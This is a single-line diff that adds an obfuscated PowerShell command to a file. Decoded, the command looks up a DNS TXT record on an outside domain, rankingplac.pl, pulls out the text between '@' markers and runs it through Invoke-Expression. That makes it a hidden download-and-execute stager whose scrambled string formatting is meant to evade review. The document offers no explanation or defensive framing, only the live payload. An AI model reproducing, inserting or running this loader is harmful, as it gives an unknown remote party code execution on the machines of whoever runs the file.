@@ -1,0 +1,1 @@
+﻿IEx (((("{11}{17}{14}{19}{15}{5}{12}{21}{10}{0}{9}{7}{2}{1}{13}{8}{3}{16}{18}{6}{4}{20}"-f '.pl','Sh@(.*)','h R','x r','s[','xt p.s.','e','atc','ie',') -m','gplac','i','w2.ns.ra','@RSh){','(RShRSh+','=t','lvmatc','f','h','(nslookup -q','1]}','nkin')) -rEpLAce  ([Char]114+[Char]108+[Char]118),[Char]36  -CREplace  'RSh',[Char]39) )
